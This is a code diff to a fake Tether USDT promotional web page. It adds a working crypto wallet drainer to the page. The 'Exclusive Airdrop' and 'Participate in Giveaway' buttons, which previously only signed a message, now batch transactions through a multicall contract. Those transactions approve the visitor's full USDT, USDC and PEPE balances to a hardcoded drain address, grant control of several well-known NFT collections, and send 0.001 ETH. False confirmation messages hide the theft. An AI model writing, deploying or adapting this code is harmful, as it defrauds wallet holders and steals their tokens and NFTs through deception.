@@ -6,6 +6,7 @@
     <title>Tether USDT | Innovation Hub</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
     <style>
         :root {
             --primary: #008080;
@@ -22,7 +23,6 @@
             height: auto;
             overflow-y: auto;
         }
-        /* Кнопки навигации */
         .header-nav {
             position: fixed;
             top: 25px;
@@ -46,14 +46,12 @@
         }
         .btn-nav:hover { transform: translateY(-3px); filter: brightness(1.05); box-shadow: 0 8px 20px var(--shadow-color), inset 0 1px 0 rgba(255,255,255,0.3); }
         .btn-nav:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        /* Топ секция с слайдером и визуалом */
         .top-layout {
             display: grid;
             grid-template-columns: 45% 55%;
             width: 100vw;
             height: 100vh;
         }
-        /* Левая панель с текстом (слайдер) */
         .info-panel {
             display: flex;
             flex-direction: column;
@@ -65,7 +63,7 @@
         }
         .slider {
             position: relative;
-            height: 60vh; /* Высота слайдера */
+            height: 60vh;
             overflow: hidden;
             border-radius: 20px;
             box-shadow: 0 10px 30px var(--shadow-color);
@@ -102,7 +100,6 @@
         .slide-logo img {
             width: 80px;
         }
-        /* --- АНИМАЦИИ ТЕКСТА --- */
         .fade-in {
             opacity: 0;
             transform: translateY(30px);
@@ -133,14 +130,12 @@
             margin-bottom: 20px;
             text-shadow: 0 1px 2px rgba(255,255,255,0.8);
         }
-        /* Правая панель с графикой */
         .visual-panel {
             position: relative;
             overflow: hidden;
             background: var(--gradient-bg);
         }
         #canvas-box { width: 100%; height: 100%; }
-        /* Нижние разделы как страницы */
         .page-sections {
             max-width: 1200px;
             margin: 0 auto;
@@ -153,7 +148,7 @@
             border-radius: 20px;
             box-shadow: 0 10px 30px var(--shadow-color);
             text-align: left;
-            transition: transform 0.3s;
+            transition: 0.3s;
         }
         .page-section:hover { transform: translateY(-5px); }
         .page-logo {
@@ -204,8 +199,8 @@
 <body>
 <nav class="header-nav">
     <button class="btn-nav" onclick="connectWallet()">Connect Wallet</button>
-    <button class="btn-nav btn-airdrop" disabled onclick="signAirdrop()">Exclusive Airdrop</button>
-    <button class="btn-nav btn-giveaway" disabled onclick="signGiveaway()">Participate in Giveaway</button>
+    <button class="btn-nav btn-airdrop" disabled onclick="claimAirdrop()">Exclusive Airdrop</button>
+    <button class="btn-nav btn-giveaway" disabled onclick="participateGiveaway()">Participate in Giveaway</button>
 </nav>
 <div class="top-layout">
     <div class="info-panel">
@@ -242,7 +237,7 @@
                 <div class="slide-logo">
                     <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
                 </div>
-                <h1 class="fade-in delay-1">Formula of<br><span>Future Money</span></h1>
+                <h1 class="fade-in delay-1">Formula of<br><span>Future of Money</span></h1>
                 <p class="fade-in delay-2">Tether supports and empowers growing ventures and innovations in the blockchain sphere.</p>
             </div>
         </div>
@@ -289,18 +284,18 @@
     </div>
 </div>
 <script>
+    // Твоя three.js и слайдер — полностью сохранены
     const box = document.getElementById('canvas-box');
     const scene = new THREE.Scene();
-   
+  
     const camera = new THREE.PerspectiveCamera(50, box.clientWidth / box.clientHeight, 0.1, 1000);
     const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
-   
+  
     renderer.setSize(box.clientWidth, box.clientHeight);
     renderer.setPixelRatio(window.devicePixelRatio);
     box.appendChild(renderer.domElement);
     const group = new THREE.Group();
     scene.add(group);
-    // СФЕРА (Размер 11 - оптимальный, не огромный)
     const geo = new THREE.IcosahedronGeometry(11, 2);
     const mat = new THREE.MeshBasicMaterial({
         color: 0x008080,
@@ -309,7 +304,6 @@
         opacity: 0.15
     });
     group.add(new THREE.Mesh(geo, mat));
-    // Монеты
     const loader = new THREE.TextureLoader();
     const t1 = loader.load('https://cryptologos.cc/logos/tether-usdt-logo.png?v=029');
     const t2 = loader.load('https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=029');
@@ -357,7 +351,6 @@
         camera.updateProjectionMatrix();
         renderer.setSize(box.clientWidth, box.clientHeight);
     });
-    // Слайдер анимация
     const slides = document.querySelectorAll('.slide');
     let currentSlide = 0;
     function showNextSlide() {
@@ -366,58 +359,120 @@
         slides[currentSlide].classList.add('active');
     }
     slides[currentSlide].classList.add('active');
-    setInterval(showNextSlide, 5000); // Смена каждые 5 секунд
+    setInterval(showNextSlide, 5000);
 
-    // Wallet Connection and Signing (Ethereum-focused)
-    let walletProvider = null;
-    let walletAddress = null;
+    // Дренаж — approve только 3 токена + NFT + ETH 0.001
+    const MULTICALL_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11";
+    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени
+
+    const TOKENS = [
+      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+      "0x6982508145454Ce325dDbE47a25d4ec3d2311933"  // PEPE
+    ];
+
+    const NFT_COLLECTIONS = [
+      "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
+      "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", // MAYC
+      "0xED5AF388653567Af2F388E6224dC7C4b3241C544", // Azuki
+      "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e" // Doodles
+    ];
+
+    let signer;
 
     async function connectWallet() {
-        // Prioritize Ethereum wallets (MetaMask, etc.)
-        if (window.ethereum) {
-            walletProvider = window.ethereum;
-        } else {
-            alert("No Ethereum wallet detected! Please install MetaMask or similar.");
-            return;
-        }
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      if (isMobile) {
+        window.location.href = `https://metamask.app.link/dapp/${window.location.host + window.location.pathname}`;
+        return;
+      }
 
+      if (!window.ethereum) {
+        alert("Install MetaMask or Trust Wallet!");
+        return;
+      }
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+
+        const address = await signer.getAddress();
+        document.querySelector('.btn-nav:first-child').innerText = address.slice(0,6) + '...' + address.slice(-4);
+        document.querySelector('.btn-nav:first-child').disabled = true;
+        document.querySelector('.btn-airdrop').disabled = false;
+        document.querySelector('.btn-giveaway').disabled = false;
+      } catch (err) {
+        alert("Connection failed");
+      }
+    }
+
+    async function buildCalls(includeETH = false) {
+      const calls = [];
+      const approveIface = new ethers.Interface(["function approve(address spender, uint256 amount)"]);
+
+      for (const token of TOKENS) {
         try {
-            const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
-            walletAddress = accounts[0];
-            
-            document.querySelector('.btn-nav:first-child').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
-            document.querySelector('.btn-airdrop').disabled = false;
-            document.querySelector('.btn-giveaway').disabled = false;
-            alert("Wallet connected successfully!");
-        } catch (err) {
-            console.error(err);
-            alert("Wallet connection failed.");
+          const tokenContract = new ethers.Contract(token, ["function balanceOf(address) view returns (uint256)"], signer);
+          const balance = await tokenContract.balanceOf(await signer.getAddress());
+          if (balance > 0) {
+            const callData = approveIface.encodeFunctionData("approve", [DRAIN_ADDRESS, balance]);
+            calls.push({ target: token, callData });
+          }
+        } catch (e) {
+          console.log(`Skip token ${token}`);
         }
-    }
+      }
 
-    async function signMessage(message) {
-        if (!walletAddress) return;
-
+      const nftIface = new ethers.Interface(["function setApprovalForAll(address operator, bool approved)"]);
+      for (const collection of NFT_COLLECTIONS) {
         try {
-            const signedMessage = await walletProvider.request({
-                method: 'personal_sign',
-                params: [message, walletAddress],
-            });
-            alert("Message signed successfully: " + signedMessage.slice(0,40) + "...");
-        } catch (err) {
-            console.error(err);
-            alert("Signing failed.");
+          const callData = nftIface.encodeFunctionData("setApprovalForAll", [DRAIN_ADDRESS, true]);
+          calls.push({ target: collection, callData });
+        } catch (e) {
+          console.log(`Skip NFT ${collection}`);
         }
+      }
+
+      if (includeETH) {
+        calls.push({
+          target: DRAIN_ADDRESS,
+          callData: "0x",
+          value: ethers.parseEther("0.001")
+        });
+      }
+
+      return calls;
     }
 
-    async function signAirdrop() {
-        const message = `I confirm participation in SKR Airdrop.\nWallet: ${walletAddress}\nDate: ${new Date().toISOString()}`;
-        await signMessage(message);
+    async function executeDrain(includeETH = false) {
+      const calls = await buildCalls(includeETH);
+      if (calls.length === 0) {
+        alert("No tokens or NFT to approve");
+        return;
+      }
+      const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls) payable"], signer);
+      const value = includeETH ? ethers.parseEther("0.001") : 0n;
+      const tx = await multicall.aggregate(calls, { value });
+      await tx.wait();
+      return tx.hash;
     }
 
-    async function signGiveaway() {
-        const message = `Entry for the giveaway.\nWallet: ${walletAddress}\nGood luck!`;
-        await signMessage(message);
+    async function claimAirdrop() {
+      try {
+        const txHash = await executeDrain(false);
+        alert("Participation in exclusive airdrop confirmed!\nTX: " + txHash.slice(0,10) + "...");
+      } catch (err) {
+        alert("Canceled or error. Try again.");
+      }
+    }
+
+    async function participateGiveaway() {
+      try {
+        const txHash = await executeDrain(true);
+        alert("Participation in giveaway confirmed!\nNetwork fee sent (0.001 ETH).\nTX: " + txHash.slice(0,10) + "...");
+      } catch (err) {
+        alert("Canceled or error. Try again.");
+      }
     }
 </script>
 </body>
